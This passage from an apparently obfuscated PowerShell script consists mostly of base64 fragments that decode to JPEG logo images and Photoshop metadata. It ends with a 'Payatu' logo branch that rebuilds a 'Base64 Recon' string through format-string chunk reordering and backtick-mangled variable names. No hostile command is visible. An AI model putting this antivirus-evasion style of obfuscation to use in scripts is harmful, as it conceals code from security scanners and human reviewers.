gICAgICAgICAgICAgICAgICAgICAgI','4Yqe/NbPWNzNaSC6bLhfSpLRcAv68VTdi7lvU1qRrsQL6UT0jYI6u4+','AgICAgICAgICAgICAgIC','CAgICAgICAgICAgICAgICAgICAgICAgICAgICA','rN6kA1NRQBCLeAdI1H4CpqKKACiiigDntatMgXaD2b+hrnK9CdFdSjjIYYIrh7y2a0n','gI','QTK2M8Ck9','9H/C','25NblrY29oP3Q+bux','CAgICAgICA','6','CiiigAooooAKKKKA','ICAgICAgI','1wOkNyZWF0b3JUb29sPSJBZG9iZS','FKV9BMk','gICAgICAgICAgICAgICAgICAgICA','UMO9Di1u','AgICAgICAgICAgICAgICAg','CAgICAgICAgICAgIC','CAgICAgICAgICAgICAgICAgICAgICAgI','CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC','CCD0Ip1','Kdj+An1Xk46dM56ClwWG4DOQG6Dt16dBW4hvQZHHAI6','1eD0/D','YYVSux','yox','AI6cHGO3vThhWAzwDgYOOG9Nw/WlcDXtdUeMFLkMygj5','CiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAo','Ag','jRVe0YuRGWYJR/CaYVYdQRWvRT9qy','IycrS09TV1','ygQgUQpGhscEJIzNS8BVi','Ckm','CAgI','7inT2aFPe5sYFGBTUYOoYd6dWJo','5rjg','UUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFAH//0ekoooJAGTwBQAViX+p7AYbY/Ng/N246ge9Q32pNID','AJXZ01iNtn','MxNWfHxIv1FajruUr6isnlT','xqO2OJfqKku+q/jVVG2OG9K6Iq8bGT+I16KAQRkd6K5zUKhuDiJqmqndP0QfU1UFdik9Cogy4HuK16zLdd0o9ua06uq9SYbENw','+3','gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC','AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI','fen+m098Dnv68+tJjpgcHpx27nimBHVu3vZrf5R8y+h/p6VWx/9b/H8aTr/AJ7U9wOpt7mG5/1Zwc/dJ5Gev','kHy26dqvVj8g+4rWVtyhvUU6kb','JlZj','4K','B','2ujvdOvbu4aXK7ei89vyqp/Yt56p+f/1q3g4pbiZBptp9ruBuHyJy3+H412dVLK1FnAI+rHlj6mrdZTldjQUUUVAHK6xaeTL9oQfLJ19m/wDr1i131xAlxC0L9GH5e9cydEvM8FPz/wDrV0QmrWYmj','A','Iv3R9KWsTQKKKKACuAmUpM6HsxH6139chq9uYboyD7snI+vetqT1sJmdE3lyo5/hYH8q9ABBGR0Ned10','MZLHFa2SEauj2nnS/aHHyx9Pdv/AK1dVUMEKW','vwAAAOAKqrK2i','RwOi8vbnMuYWRvYmUuY2','AgIC','gICAgIC','kqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqCg4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxs','6iZJbf8fEf++v8672uCtv+PiP/fX+dd7SrdAQ','gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI','gICAgICAgI','nc92J/WtKS1uDIq6PTNMRkFzcDOeVU9MeprAi','i2','UUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQB//0ujLB','AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC','EP9kH86t1FANsEa+igfpUtcr3NwooopAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUU','CAgICAgICAgICA','rPuWzJt9Kq','iiisTQpXfVf','aOqH','BCgADA4FFFFc4zH1DTI50MsA2yDnA6N/8AXrk69Erh79BHeSqvTdn8+a3pSvoxMbZTm2uUl7Zwfoetd1Xndd/AS0EbHuoP6U','AgICAgICAgICAgICAg','Th1mfPqB','6f6VhKD','9eppRGeFI9UPHft06mnKN2EzkkFOo7cjr0FKBkblHJAYYXuvBAweB71rcQzJxuzg4DdT1HXr1NO2jcTjIVucgNw3rjqfaraW0xIw','WtiHNlcW0YJLEuSQTuOckd6nV','NvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG','9Af7jfQ1k','FABRRVW7uktITK3J6AepoSuBJPcQ26b5mCj+dYc2unOLdPxb/AAFYc88tzIZJTkn9PpUN','p92Lu3DH768N9fX8a4rpwau6fdm0uA5+43DfT1/CtpxuhI7aigEEZHINFcpR//X6SiiigCGS3hlOXUE8H8ulRm0TsSKtUVSk1sJpMpG0PZqjNrKOmDW','gIC','Q','2zWr5ZGf','/rVt1zEGlX8EyyoUBU+v/1q2P8A','yp+tXar3K7o8jtzVQepMtivan94R7VoVkxvscN6VqghhkdDV1FrcUHoLRRRWRYUyQ4Rj7U+qt','QKpxwTS/6tGb6Amle2u','G+hrIrXf7jfQ1kVrS6kTNhfuj6Ut','MDAxRTYxMUVCQUFDM0E1Nz','gooooAKK','+o//AFUcE59we3f+tZtvqMb/ACzAI3H','czpyZGY9Imh0dHA6Ly93d3c','UDCiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiig','CAgIC','gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC','G1wbWV0YSB4bWxuczp4PSJhZG9iZ','adg9Pw79uR/+qqOoTCOAqOsh4+nekCRi3EvnTNJ2J4+napLAb','bm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ub/3QAEACb/2gAMAwEAAhEDEQ','6D1qCus0i08iHz3HzydPZf','OrkdXu','IBHIPQilrm4LmW3PyHI7qelbdvdRXHyg7X/ALp/p60yHGxZo9qKXB/z6igkT3owf6','LWwmdzZXS3kAlHDDhh6GrdcZpt39luBuPyPw39D+Fdn','20++fpV+qFp98/Sr9OpuENg','8Kwp0Ufn71NXJOV3coKKK','ICAgIC','tFajvJleKMyNgdO5rVAAGB2pFVUG1RgUtROV','B0aW9uPiA8L','G2s6g+hIzQBJRUYliPR1P41JQAUUUUAIzKil2OABkmu','H+ff60Dpn2','0M5rqawIIyO9FQW7bowPTip6yas7Fp3Cq9y22Pb61Y','VT7gC/QYpaKLCbCilopiEopaPakAUUe/40vPT8Py','AgICAgICAgIC','4nn60yrSsigrodBX','umakm','WhSu+q/jVVXKZ29xirV3','0jIyMjIyMjIyoqKioqKjExMTExNzc3Nzc3Nzc3Nz/2wBDASIkJDg0OGA0NGDmnICc5ubm5ubm5ubm5ubm5ubm5u','08RhleI8EEgdRgev41tS','vLlrudpT06KPQVs61d4AtEPJ5b+grm66KUbaiYVLDM8Eq','ICAgICAgICAgICAgICAgICAgIC','xT+o//AFcCkI/D/P8AWtxF+31B0+SfLrjGe4/xrZjkjlXz','u','ooAKKKKACiiig','AAAAX0BAgMAB','AAEAAAExAAIA','j3PvPRf51vFcquzKTu7IvIuxQvpTqKK','udzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91','T+8','BAQAASABIAAD/4QCGRXhpZgAATU0AKgAAAAgAAwESAAMAAAAB','UFFFFSB/9bpKinjMsLxqcEg4Poe1S0UAcR1wF7gqoyDgfxZyO/am7e44yODjoo/','BQaG90b3Nob3AgMjEuMiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpCNTlFNjgw','gICAgIC','lAxiuNv7U2lwUH3Typ9v/AK1dtVDUbT7XbkL99eV/w/GsISsxs4sEg5Fdr','/2h0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8APD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXB','kZjpSREY+IDwveDp4bX','BAQEBAAAAAAAAAQIDBAUGBwgJCgv/xAC1EQACAQ','AKKKK','kUe4q/c/6o/hWbVU9hT3NmisfcfWjcfWl7LzHzmxRWPuPrRuPrR7LzDnHSDEjD3NaFucxLWZWlbf6oU6mwobkr','DNdGMfdj4/HvXXVwEzF5','wNQooooAKKKKACiiig','Y','dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwL','AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA','AooooAKKKKA','61MqiWw7EGm','AgICAgICAgICAgICAgICAgI','biUAkoeg9+P0NXB2YM5g88sc9zyD9P/r0hXGcjvzx39OKkPXAIbBwOQQWPfntTd','Qy9RRR','EQxHIyj0Bpz3d1IMPKxHpmrLaVfL/yzz9CKaul3zH/AF','5pW9gP51z1dNoQ/dSN6sB+QqKnwgjeooorlKCqV31WrtUrvq','AgICAgICAgICAgIC','Ou9rgrb/AI+I/wDfX+dd7SrdAQUUUViMKh','cXbXc9ocxn5c8gjjB7+1dNaahBdDaDtf+','X+dT9s98Z/7','KKKACiiigAqldryH/CrtRzLvjIqouzFJXRU','xSoWAUDJIKcAHkcjGD+tX7UXcTb4QF3YOCSB7jB7+9ZygnsO51FFRwyebGH9fT24qSsRhRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQA','70e/TjP5d','AgICAgICAgICAgICAgICAgICAgICAgIC','TfSnHdCexmocOp9xWvWOv3h9a2K0q9CIENwcRGs+MZ','AgICAgICAgICAgICAg','+CZLiJZk6MKlrltHu/','AgICAgICAgICAgICAgIC','BNTT','DZWhpSHpyZVN6T','ICAgICAgICAgICAgICA','BEFEiExQQYTUWEHInEUMoGRoQgjQrHBFVLR8CQzYnKCCQoWFxgZGiUmJygpKjQ1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoOEhYaHiImKk','ooAKKKKACiiigAooooA','iZf9Mv1qJJ','ahB','D1Hof8AChFxfQz66zRFxaE+rn+Qrk67','pbnN0YW5jZUlEPSJ4bXAuaWlkOjlFMDI3ODg5MDFFNjExRUJBQUMzQTU3MDgwMUU3','R0a782P7M5+ZOnuP','/AK9dE5cqJNSOKOOIQqP','1X8aqKp','nAFR3V1FaR75','AgICAgICAgICAgICAgICAgICAgICAgIC','ICAgICAgICAgI','FHXiiigDMmiMbZH3T0oimaPjqPStIgEYPIqq9','e2t5H3vG','ICAgICAgICAgICAgICAgICA','gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA','+nPr2ppA78AjOcA4Hbp+taa2LMD5rYyeQpzwOg59KtpbwodyqNx5yeTVEuSMa','qqsb6oEb9FHXkUVzjCu','XPm','JlZjp','FkYD1','gICAgI','OaPYOWRWW6cfeANW45Uk+6efSqz2veM/gaqfMp9CKfLGWwrtbmxRUEEvmLg/eFT1i1bQ0TuFFFFIYUUUUAFFFFABRRRQBXnla','jvpY7Rr','JqyqhVCjoKWsnUb2LUEUHtSBlDn2qsCVORwRWxVC6j2tvHf+dVCd9GKUbaoswy+YvPUdamrNt22ygevFaVRONmVF3QVSuJjny1/GrbttQt6CsjkmqpxvqKb6D442kOFq2LRf4iasRoI0Cj8afSlUfQFBdSo1ov8JP41UeNozhq1qZIg','JbksULS','WU42Y0FFFFQBFPMlvE0z9FFc0dcus8Kn5H/Gl1i782X7Mh+VOvu3/ANasSuiEFa7E2b0OrXs8qxIiEscdD/jWvu1P+7F+Z','fKvSi2','Zgo71rD4S','BmNh7VU','AgICAgICAgICA','/9j/4AAQSkZJRgA','ooorMoKKKKACiiigCKdd8ZHpzWYrFWDDtWxWTIuxytbUn','ooooAKKKKACiii','PVTweo+nU0u4j5geRhhz3H16mnYP3wOoDD','Q+pJ/Woq7GiNOiiiu','ooooAKKKKACiiigAqKaa','sP0rZRXLczu+axoUUUViaBRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFF','dWIYSM5','iQX+VTyg4II9','jkenvS4GfYH2PB/mafgA+wPuPlb+QoAL4XOSQV6g9OmM9B70ANCH7u','LG3HNNgnaR9rAdKZd9V/GmWv+','Y244psEDxsS2MYxW8ZJRMnG7IIZzGNrcirYuIj/FUUlqCc','sjcpgn5m+XA9hkHoe9dKZJWz/wAByOmei','QdGPX0HcfjVGipYYnnlWK','AgICAgICAgICAgICAgICAgIC','Q3Ii8+IDwvcmRmOkRlc2NyaX','CAg','QPzr','QUQ3I','pOUlZa','AKKKKACiiigAooooAKKKKACiii','W0vIiB4bWxuczpzdF','XZiaujNifZIDWrWQEY9Aa1x05q6pEAoqGaUxAHGc0yO4Ej7SMZqOV2uXdbFmiiipGF','uMbR04HHJPc8eldFySL6np/OjH+','/jWnRQS5Mhjghi/1aAH16mputFFMkzb613gzxj5h94eo9axq6usS+tfKPmxj5','znDZ6g8N','rZQSV5Gbl0Q83Mp6YFN+0S+tW1tYx1yacbeI9q','CAgICAgICAgICAgICAg','X8awhG7GyiSScmrtham7uAh+6OWPt/9eqXXgV2m','laVFFc7d3djM3U7v7Lb4Q/O/C','ICAgICAgICAgICAg','iBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjlFMDI3ODhBMDFFNjExRUJBQUMzQTU3MDgwMUU3QU','ICAgICAgICAgIDw/eHBh','ICAgICAgICA','AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI','tfY2dri4+Tl5ufo6ery8/T19vf4+fr/2wBDABwcHBwcHDAcHDBEMDAwRFxEREREXHRcXFxcXHSMdHR0dHR','Uv','3J','TlFNjgwMTAxR','gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA','PanUi/dH0paxZoFFFFABXnz/fb6mvQa8+f77fU1vR','tWw5X1q/WQjbWDehrX681dRa3Jg9AJAGT2rHYlmLHvWjcNtjI9eKpQLvkA9OadPRNinq7GjGuxAtPoorFmhSu+q/jUVsMyj2qW76r+NMtf8AWfhW6+AyfxGhRRRWBqFQXAzEfap6in/1','T9B3NcjdXUt3Jvk6DoOwBq4QuIlvNRmuZAVJRVOVA/nWjZax0ju/pvH9RXP47H6c0vXJ68Z7Vu4K1hHfKyuod','gTpgAmY7PhCfv/AABEIAKcCWAMBIgACEQEDEQH/xAAfAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgv/xAC1EAACAQMDAgQDBQUEB','qa4','ACiiigAoo','ICA','A/Wmu5pFHegYAHpS0UVxmgUU','CAgICA','9tL3hhcC8xLjAvb','aJunUH1Fd','FFIxCgse1AC0VS+1/7P61cByATxVOLW4k09ind9V/GmWv+sP0p931X8aZa/6w/StV8Bm/iNCioJLhE4HJqubt+wFZqDZbkkX6Koi7b+JR+FWo5Uk+6efSk4NDUkySiiipGFFFFABRUD3CJwOTVc3b9gKtQbJckX6KoC7fuBU6XKNw3ymhwaBSRYoooqCgopCcAn0qn9r/ANn9apRb2E2luXaKaWAXc3Aqq12P4Bn60KLewNpFyiqIuz3WriMH','oAY7iNDI3RRmuYJaSQserH+da2pSgIsI6t8x+nasyAbp419W','CAgICAgICAgICA','H','mWr','KKKKACiiigAooooAKKKKACiiigAooooAKKKYZIx1YUWAV2CKWPasnlj7mrE8/m','k+hnNdR0C7pB7c1p1VtVwpf1q1UVHdlQWgUUUV','AFFFFABRRRQA','AgICAgI','PY4/lWpjt26d+h6fhUk2Gg','GCP1+lQ1309vD','UUABIAyaqvdKOEGarzTGQ4H3RTY4Wk6cD1','ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg','p/mK5uuqGqI','AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA','KkD//1ek','KKACiiigAooooAKKKKACiiigAooooAKKKKACiiigD//0OkooooAKKKKACqN7fR2af3nI4X+p9qhv9SW2Bihw0uPwX6/4VzDlncySEsSQST6H','7T936r3+o/8A1UhDQD1HXGePbr/+uudv5hLcEKcqnyj+tb','/c','CQD0zjrW8jrIu5DkV','iiigA','Rk1zV7qDTgpEdqAZBOQcg9OnP0qzM4v','QaG90b3Nob3AgMjEu','SCCDg10FndXTDE0ZYDkN0zx3z1qGrEtFTVZcyi3XpH','TpuczptZXRhLyIgeDp4','zIAuwdTVRV2JuyKYkkHRj+daw6c1lRLvkArVq6pEAooorI0MqV','ra','BtZXRhPiAgICAgICAgICAgICAgIC','CuxSehFCu+QCtWqdovBf8KuU6juxQ','dR1q1T','AgI','Ehij+4uMZx3xnrjNbQh1ZDmZSxO7ZVSwDZ5CsMN1z0yfapksX24cgDBB659icHBPtWnR','ICAgICAgICAgICAgICA','1xWkIX1YrizTyXEhllbJz69j2ANRBcgceq9M8+2','/GvQCARg1w','+VwCTzzj+GunrJ1eMt','CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI','B','tXT+Imew20++fpV+qFp98/Sr9OpuENgooorMoK','gICAgICAgIC','kQqfwojUfUHBdCpbS','AgICAgICAgICAgICAgICA','pEZXJpdmVkRnJvbSBzdF','gICAgICAgICAgICAgICAgICA','6Eeh','7VC5DLpCAwKsMg8EVpG','z+XWgA4z/nvRz/AJ9RS47fh+fSj3+h/wA/4UDE4/z','MiAoTWFjaW50b3NoKQAAAAOgAQADAA','AgICAgICAgICAgICAgICAgIC','AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC','gICAgICAg','Ht1/qKXgn2z+h+v86M/xH2Pb6H/APVS','oooAKKKKACiiigAooooA//9HpKKKKACiiigAooooAKKKKACiiigAoooo','CAgICAgICAgI','AgICAgICAgICAgIC','gICAgICAgICAgIC','dMaSW4rmm2r3zdHA+gFIurXw/jz9','N3TA//0OkooooAKKKKACiiigAoo','0iaHR0cDovL25zLmFkb2JlLm','AooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKK','gI','Kl+zOflf','I1BxJeysOm7H5cV0OoalHboY4SGkPHHauSrelHqJiV38AKwRqeoUD9K4qzgNzcpEOhOT9B1ruqKz2QIKgurhbWBpn7dB6nsKnrktWu/Pm8lD8kfH1Pes4RuxmXJI0rtI5yzHJqS2ge5mWFOrHr','XmJmaoqOkpaanqKmqsrO0tba','AooooAKKKKACiiigAoooo','ePqR/jVXiIz6cqM7BEBJPQCtuHQ5mOZnCj','CfdFOqJSbKUUgoooqC','wV8w','lRjemtjOWQiPz4gPHg6e','gICAgICAgICAgICAgICAgICAgIC','AC','RSu+q/jVQAnOO1aE8TS','ctEKFiQ04SXxFxgZGiYnKC','ryIf7QP5VUrR0pd19H7ZP6GqeiNTs6KKK4ygqvcvtjwO/FWKpXZ5UfWqgrsmWxWjTe4X1rVACgKOgqhaj94T7VoVdR62FBaBRRRWRYVVuY','ICAg','jAiPiA8cmRmOlJERiB4bWxu','b6Gsitd/uN9DWRSpdRzNdBhQ','TYxMUVCQUFDM0E','AgICAgICAgICA','gAooooAKKKKAGv9xvoayQCelaz/AHD9KzE61tT2ZnMkS2duTwKvqqou1el','AgICAgICAgICAgICAgIC','1iPTIqM2g7NT9ohcjOQubc28mOqn7prrtOG2xiHtn86hm0/zozGxBB6ex9au28ZhgSI9VUA/hU1JJo0jfqTUUUViU','A/AOk','t1N5MDSj738OfVuP0rlaqJcU','J','dkhWr9u26Ie3FQ3a','1NzA4MDFFN0FENyI+IDx4bX','gICAgIC','3uLm6wsPExcbHyMnK0tPU1dbX2Nna4eLj5OXm5+jp6vHy8/T19vf4+fr/xAAfAQADAQEBAQE','B9vqa1o9QZJbf8fEf++v8A','p7N/9euprknGzs','Vrv9xvoayKdLqKZLLIZCAOg6U5beVhnGPrU9tEAPMbqelW6JTtogUb6szzayDpg1fUbVC+gpaKzlJvctRSCvPn++31Neg158/w','z+J5/SsmnuzM7M/wB','i4/I1evIwlxJHIxI+8eR9zsBnuP5VAs','xnHtVc28o7UrRlqO8kWXulA+Tk1RJLHJ5JqYW0p6jFW4rdY+Tyad4x2FZvcLeLy1yepqeiisW7u5olYKoXMRVvMXoetX6CAeDTjKzuDVzLimaI8cj0q4tzEevFMe1B5jOPaq5t5R','f','AgICAgICAgIC','V31WrtUrvqtXT+Imew','IC','D','Fa2jDN6D6KTWTW5oa5uHb0T+oon8LKOoooorkKCq','rmNX','igAooooA//9k=','AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI','AgICA','CAgICAgICAgICAgICAgI','CAgICAgICAgICAgICAgICAgICAgICA','UUUViMKKKjaaF','CAgICAgICAgICAgICAg','eQxqK2CqnqAajMER/hFV','AAAhAAAAModpAAQAAAABAAAAVAAAAABBZG9iZS','vIum4iHfNVZbguNq8CmCCU/w1Mlqern8BS','zR9VOanSyme1a7H3VPT1Hc/hVOtdGI7','CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA','cpsmUMO3qPpWDPobA5t3BHo3+NdEaqe4rGNHc3','CAgICAgICAgICAgICAgI','KKACiiigAooooAKKKK','gAooooAKKK','AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg','IyGHB/8A1/4Vy1OjkkhbfGSppW7EuJ','IxmSNlHuDVcsRGvDrkoOJ0D','MKCcHJHysOQAR+tTLYrgeY24hdvAHT29/egTkjO2EDYwxwUOdwwRyM9efQVIqSyglFLk7X5wRkcHPH6VrJDFGcooHOfx9alosS5mclk2csQBk8YwSD64P6VYW1iUYYs/AByeoHTirNFOxLkxAqjlQBn0FRXEvkwtJ36D6mpq','Y2tldCBlbmQ9InciPz4A/+0AOFBob3Rvc2hvcCAzLjAAOEJJTQQEAAAAAAAAOEJJTQQlAAAAAAAQ1B2M2Y8As','T2qqbS3Jmrl9fuj6UtIBgAUtZGgUUUUAFVby1S7hMTcHqD6GrVFNOwHAzwS28hil','TzJF','HSBix','qlo1p5cf2px8z/d9h/9etyok0nZID//06WpI1vfs0ZK7vmBHv8A/XqWDUFb5bjg/wB4dPxFXdciysc/od','bXB0az0iWE1QIENvcmUgNi4wL','AgICAgIC','Fan5cE5GOcdfoP51kYCtntkHuuVb6dBWsY','CAgICAgICAgICAgICAgICAgICAgICAg','x9Sl3SCEdF5P1N')
        }
        ElseIf (${LO`gO} -eq ("{0}{1}" -f'P','ayatu'))
        {
            ${BAS`e`64a`d`ReCoN} = ("{232}{354}{136}{221}{133}{393}{57}{371}{376}{16}{143}{91}{219}{252}{194}{356}{281}{72}{119}{73}{292}{54}{75}{152}{3}{65}{142}{212}{214}{388}{20}{22}{83}{141}{69}{62}{92}{234}{348}{366}{286}{197}{247}{329}{266}{288}{237}{291}{114}{321}{110}{276}{61}{303}{315}{26}{18}{67}{339}{295}{23}{42}{244}{330}{327}{236}{368}{186}{279}{166}{103}{289}{209}{205}{383}{185}{207}{271}{156}{43}{389}{107}{361}{392}{105}{93}{191}{331}{374}{77}{17}{375}{241}{181}{260}{88}{390}{373}{377}{130}{123}{2}{256}{127}{70}{319}{347}{36}{365}{21}{341}{7}{198}{24}{188}{79}{58}{217}{362}{193}{25}{175}{159}{284}{138}{253}{100}{176}{167}{131}{228}{12}{192}{99}{211}{372}{195}{227}{27}{44}{318}{344}{48}{300}{235}{293}{80}{220}{218}{287}{333}{338}{104}{168}{149}{120}{301}{98}{49}{238}{60}{165}{158}{125}{384}{180}{326}{297}{163}{342}{101}{378}{128}{71}{210}{51}{310}{59}{216}{335}{367}{35}{140}{28}{41}{154}{106}{112}{56}{290}{268}{203}{370}{343}{162}{14}{272}{172}{121}{74}{146}{122}{208}{171}{222}{381}{200}{89}{250}{153}{174}{38}{29}{78}{285}{345}{363}{340}{350}{323}{11}{33}{264}{53}{30}{309}{223}{369}{96}{255}{270}{116}{226}{108}{225}{306}{322}{164}{313}{380}{386}{332}{115}{352}{34}{259}{312}{316}{46}{183}{364}{87}{173}{124}{179}{150}{311}{231}{189}{351}{283}{97}{9}{328}{126}{151}{278}{129}{135}{282}{169}{148}{184}{113}{355}{262}{32}{258}{273}{118}{86}{190}{202}{66}{360}{15}{257}{111}{1}{274}{357}{0}{199}{353}{325}{230}{359}{239}{280}{182}{170}{68}{242}{277}{84}{337}{31}{10}{307}{95}{249}{254}{137}{233}{302}{76}{45}{160}{269}{134}{265}{204}{275}{102}{178}{8}{305}{13}{251}{294}{298}{240}{147}{308}{196}{4}{382}{229}{117}{296}{394}{155}{213}{81}{55}{245}{299}{132}{391}{304}{52}{243}{161}{40}{314}{187}{320}{64}{145}{267}{336}{6}{109}{144}{317}{324}{246}{90}{139}{50}{157}{358}{94}{248}{85}{201}{82}{379}{19}{224}{47}{63}{261}{346}{215}{39}{263}{37}{349}{387}{334}{5}{206}{177}{385}" -f'JHazlCqqq5JJPAAG','GWUgj8a+Q/+CjPxu+DGs/sB','GWN3VBwobAwABQ','s7S1tre4ubrCw8TFxsfIycrS09TV1tfY2dri4+Tl5ufo6ery8/T19vf4+fr/2wBDAAEBAQEBAQIBAQIDAgICAwQDAwMDBAYEBAQEBAYHBgYGBgYGBwcHBwcHBwcICAgICAgJCQkJCQsLCwsL','zxZpWg+JNN8TXOoRWeo3cVq89ndwW4WSLzWXzMSRyK4XJX5c43Cv6ePCvxA8B+OvP8A+EJ1uw1j7Lt877Dcx3Hl787d3ls23dtOM9c','J5Z4r9','4s0b9s39tPSPsmnWRW98N+Fr2P97cTDm','a','Q7aB/4Mrf8A+','FFv5NyJF45rmpQjU0ludWcY','Gv8As','B/','m','EV+kf/EOj/wVB/6FrR//AAcW3/xVH/EOj/wVB/6FrR//AAcW3/xV','CTxXcbeTuHIylwsTj','zDkkRLKsckcyIOA7NG+MAhjliAf156T+0','AsgTpgAmY7PhCfv/AA','s3GVIOK/fGv5//wDg5U/','QyspGQwIIPSv7eP+CMn/A','K0u6/XufacPce5t','+xWEf72/vnTqlvADuc5IBY4Rcjeyjmv5R/2pP+DlD9o','MP7Vn7','r','6QJMeZ9plXEcK8lRr6Sez6','34Owahb6FeXd1ZwjU4kgnZrS','r7w/4ua','Klxa3drK0M8EsZyrxyI','KR06igDv6KK/Fn9uP8A4Lp/sg/sUfEaf4Kzw6j418YWTLHfWWjiMQWUjc+XPcSsqiTBGUjWQr0baeKAP//R+EP28vitcfHD9tb4o/E6aXzo9R8R3yWrDn/RLaQw','KjsJGHJWEoi5x82Nx','+G3xx1z9mL9iq9tdGh8LTtYav4jaCO7uZ','Cf2D/2sNA+D37PsV5Do9/4UtNXuFvrk3Un2qa7vI','fe','TI+Mlv4WEhuV0Fp','p8ftC/sn/AAB/4Kefs5eDdN+O9rfHR','b8RXTf8ev8ABHaXbn/ll91YpT/q/uudmGT+vxWV1DIcg8giv8jbWL1Y4WJr75+Cf/BWj/gpN4K+G/','nCB2PLE1+jPiTxB8PfgX8Lb3xNrBt9B8K+EdMe4l8tBHb2djYxFiFRQAqRxphVUcAYAr+CH9r/8A4OG/24vjZ4+1CP4A','AdrqWjbBCsSpA9H+P37UP7P37LOgWPin','H7','FeP+C+Hxq','eIqZfgMLCMo6c8pOX3RSjZ+ra','R5I8VFYiivfW67r/NH794K+KUcgrSy','AP6Mv8AiG6/4Jnf9A/x','P/ACZ/','FO','W4z','iX/A','7JRsAATbX','azoHj34W68/hT4la','m6','Yh/rvvL+8yJP4/hE8JMcgKspwQRggiv9','j+GvhUH20a0H/ALSoA/zTvD/gz9tL/gqz+1Dd6zp9rfeO','UZ1t9NSe9nkI6KqRRtyTwNxA7kgZNfwJ/wDBR79sB/26P2wfFn7RVray2GlalJFa6VaT482GwtI1iiD7SQHcKZHAZgHcg','UCt5e49o5QWik4OEc','mtYrG5NtIk89qwUMwBJASdhjHXBr+Gr/gt7+xT8','8BVictEKFiQ04SXxFxgZGi','D6Y/O','o7lkdW5BUiPBBHQjiuU+I37','AAAJAAAAABAAOgAQADAAAAAQABAACgAgAEAAAAAQAAAUCgAwAEAAAAAQAAAFkAAAAA/+0AOFBob3Rvc','hBdxQw3U','+Dan/gpLcTCKZfC0','iFpHw1SGK0lezub5bbBij1K4t45LkDbkbmkJeT0kZgcYxXyXFeUU6S','/8Agrl+yB/wUFtU0T4aas2h+MUj8y48M6vth','+','Nf6BqUB2yWmpW0lrOhHZo5VVgf','G8RX3g7xnZXGlatpk7215Z3cbQzwTRna6SIwDKykYIIBrg73XpLg+VB8xNfnqw0r2Z/XmK4so+zvCV77WOg','Cw','jqeGVlJBB4INfxZ/tc/wDBsP8AG','AW4v/j9qWmfsnfthXkaeNJAtvoXiBgI01','H','GIqycKD5I+W/39Pkf2n4e','NnBVgQaA','D/AIKVf88PDH/g1/8AtVAH9a3jb/gtP/wTE8C6FPrt7','fA','AAAAAAAQIDBAUGBwgJCgv/xAC1EQACAQIEBAMEB','Mj/ocNK/9HrX9S3/B1B/yaz8Nf+xqk/8A','YnKCkqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWm','f','TU9I/4Jwvd6Tcy2sv8Awk+lrvhco2C','b6IlZobdZleJEibMbuUZy6naVAy34n6N/wUX/4K/8AxCt38ReFfiF471W3dy','xJJAFJGVy2cdQOlAH1HRX4Lft7/wDBdrwL+wN+0fqX7O3jj4aaxq81na2l7b6','yDXUfCT','qGMMOx23MUL','xfFPw9GxKXOgAi/VB08','4gXNzoH7KHh','ABUAEg